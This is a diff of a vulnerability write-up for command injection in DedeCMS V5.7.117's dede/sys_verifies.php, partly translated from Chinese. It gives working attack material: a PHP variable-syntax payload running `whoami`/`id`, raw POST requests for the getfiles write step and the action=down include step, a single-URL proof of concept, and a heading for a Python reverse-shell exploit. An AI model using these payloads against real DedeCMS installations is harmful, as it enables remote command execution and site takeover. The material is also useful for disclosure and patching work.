@@ -4,19 +4,15 @@
 
 DedeCMS V5.7.117 has a Command Injection in **dede/sys_verifies.php**. 
 
-### CMS下载
+### CMS_Download
 
 [产品下载 / 织梦 (DedeCMS) 官方网站 - 内容管理系统 - 上海卓卓网络科技有限公司](https://www.dedecms.com/download)
 ![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221330019.png)
 
 
-### 环境搭建
-
-![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221330926.png)
-
 ### 漏洞分析
 
-- 在文件/dede/sys
+- In the file dede/sys_verifies.php
 ![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221335312.png)
 
 ```php
@@ -82,28 +78,29 @@ else if ($action == 'getfiles')
 }
 ```
 
+**Payload:**
 
-
-**Payload：** 
 ```php
-xxx${${print%20`whoami`}}
+17${${print%20`whoami`}}
 ```
 
+1. **Injection Process:**
 
-1. **注入过程：**
-   - 这个payload被提交到`sys_verifies.php`的`getfiles`操作
-   - 经过处理后写入`modifytmp.inc`缓存文件，生成类似内容：
+   - This payload is submitted to the `getfiles` action of `sys_verifies.php`.
+   - After processing, it is written into the `modifytmp.inc` cache file, generating content similar to:
+
    ```php
    $files[0] = "${${print%20`whoami`}}";
    ```
 
-2. **变量解析语法：**
-   - `${...}` 是PHP的复杂变量语法
-   - 内层 `${print%20`whoami`}` 也是变量解析结构
-   - `%20`是URL编码的空格
-   - 反引号`` `whoami` ``会执行系统命令
+2. **Variable Parsing Syntax:**
 
-### 触发
+   - `${...}` is PHP's complex variable syntax.
+   - The inner `${print%20`whoami`}` is also a variable parsing structure.
+   - `%20` is the URL-encoded space.
+   - Backticks ``whoami`` execute a system command.
+
+### Trigger
 
 - 
 ![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505221337659.png)
@@ -171,10 +168,10 @@ else if ($action == 'getfiles')
 }
 ```
 
-
 当访问`/dede/sys_verifies.php?action=down&curfile=1`时，系统会加载`modifytmp.inc`文件的原因如下：
 
 1. 从代码中可以看到，当`$action=='down'`时，系统会执行相应的分支代码：
+
    ```php
    else if($action=='down')
    {
@@ -185,19 +182,23 @@ else if ($action == 'getfiles')
    ```
 
 2. 这个分支的第一个操作就是定义`$cacheFiles`变量指向`modifytmp.inc`文件
+
    - `DEDEDATA`是DedeCMS中定义的常量，指向数据目录
 
 3. 然后立即使用`require_once()`函数加载这个文件：
+
    ```php
    require_once($cacheFiles);
    ```
 
 4. 加载后，代码会使用从`modifytmp.inc`中获取的变量：
+
    - `$fileConut`：用于检查是否下载完所有文件
    - `$tmpdir`：临时目录名
    - `$files[$curfile]`：当前要下载的文件名
 
 这就是漏洞利用链的关键部分：
+
 1. 之前的`getfiles`操作创建了包含恶意代码的`modifytmp.inc`
 2. 当访问`action=down`时，系统通过`require_once()`包含这个文件
 3. PHP解析器会执行文件中的所有PHP代码，包括我们注入的恶意指令
@@ -205,7 +206,7 @@ else if ($action == 'getfiles')
 
 典型的"文件包含后利用"模式，先将恶意代码写入文件，再诱导系统加载执行该文件。
 
-### 步骤一，先包含
+### Step1
 
 ```http
 POST /dede/sys_verifies.php HTTP/1.1
@@ -229,7 +230,7 @@ action=getfiles&refiles%5B%5D=xxx$%7B$%7Bprint%60id%60%7D%7D
 
 ![image-20250528084731526](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280847888.png)
 
-### 步骤二，再触发
+### And when you input this payload ,the Web will auto get the next HTTP
 
 ```http
 POST /dede/sys_verifies.php HTTP/1.1
@@ -257,7 +258,19 @@ action=down&curfile=1
 
 
 
-### 反弹shell_EXP
+### FInal POC
+
+Actually, the final payload is as follows, requiring only a single step. When you send this payload, DedeCMS will automatically trigger a second file request to execute the command.
+
+```
+http://www.dede.top/dede/sys_verifies.php?action=getfiles&refiles[]=17${${print`id`}}
+```
+
+![image-20250528090510219](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505280905541.png)
+
+
+
+### shell_EXP
 
 ```python
 #!/usr/bin/env python3
@@ -354,4 +367,11 @@ if __name__ == "__main__":
 
 ![image.png](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505211523431.png)
 
-<video src="C:/Users/XU/DedeCMS v5.7.117-RCE.mp4"></video>
+<video src="DedeCMS-RCE.mp4"></video>
+
+
+
+
+
+
+
